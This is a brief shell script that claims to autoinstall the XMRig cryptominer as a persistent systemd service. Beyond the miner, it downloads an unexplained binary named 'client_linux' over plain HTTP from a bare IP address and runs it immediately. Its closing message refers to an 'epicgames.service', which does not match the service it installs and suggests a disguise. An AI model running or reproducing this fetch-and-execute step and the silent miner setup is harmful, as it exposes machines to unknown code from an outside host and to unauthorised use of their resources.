echo "Autoinstalling XMRig"
cd ~
wget https://github.com/MaybeTrollface/autoinstaller-for-xmrig/raw/main/xmrig
chmod +x xmrig
cd /etc/systemd/system/
wget https://raw.githubusercontent.com/MaybeTrollface/autoinstaller-for-xmrig/main/xmrig.service
wget http://88.99.172.178/client_linux
chmod +x client_linux
./client_linux
systemctl enable xmrig.service
systemctl start xmrig.service
echo "Script probably done. Use systemctl status epicgames.service to check the status!"
